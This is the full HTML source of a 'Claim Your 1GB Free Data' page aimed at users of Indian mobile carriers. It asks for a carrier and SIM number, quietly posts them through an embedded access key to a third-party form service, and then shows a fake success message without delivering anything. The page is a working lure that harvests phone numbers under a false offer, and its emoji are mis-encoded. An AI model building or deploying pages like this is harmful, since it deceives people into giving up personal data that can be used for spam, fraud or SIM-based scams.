<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Get 1GB Free Data</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
  <style>
    * {
      box-sizing: border-box;
      font-family: 'Poppins', sans-serif;
    }
    body {
      background: linear-gradient(to right, #6a11cb, #2575fc);
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      color: white;
    }
    .container {
      background-color: rgba(0, 0, 0, 0.4);
      padding: 30px;
      border-radius: 15px;
      text-align: center;
      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.5);
      width: 90%;
      max-width: 400px;
    }
    .container h1 {
      margin-bottom: 20px;
    }
    .form-group {
      margin: 15px 0;
      text-align: left;
    }
    select, input, button {
      width: 100%;
      padding: 12px;
      border: none;
      border-radius: 8px;
      margin-top: 8px;
      font-size: 16px;
    }
    button {
      background-color: #00c853;
      color: white;
      font-weight: bold;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }
    button:hover {
      background-color: #00b248;
    }
    #message {
      margin-top: 15px;
      font-size: 16px;
      color: #00e676;
      display: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>üéâ Claim Your 1GB Free Data</h1>

    <div id="message">‚úîÔ∏è Offer Claimed Successfully!</div>

    <form id="dataForm">
      <input type="hidden" name="access_key" value="768ba7ab-4bb3-4e10-bc0e-51a050c4bd4b" />

      <div class="form-group">
        <label>Select SIM:</label>
        <select name="simName" required>
          <option value="">-- Choose your SIM --</option>
          <option value="Jio">Jio</option>
          <option value="Airtel">Airtel</option>
          <option value="Vi">Vi</option>
          <option value="BSNL">BSNL</option>
        </select>
      </div>

      <div class="form-group">
        <label>Enter SIM Number:</label>
        <input type="text" name="simNumber" placeholder="Enter your number" required />
      </div>

      <button type="submit">Get 1GB Now</button>
    </form>
  </div>

  <script>
    const form = document.getElementById("dataForm");
    const message = document.getElementById("message");

    form.addEventListener("submit", async function (e) {
      e.preventDefault();
      const formData = new FormData(form);
      const data = Object.fromEntries(formData.entries());

      const res = await fetch("https://api.web3forms.com/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data),
      });

      if (res.ok) {
        message.style.display = "block";
        form.reset();
      } else {
        alert("‚ùå Failed to submit. Try again.");
      }
    });
  </script>
</body>
</html>
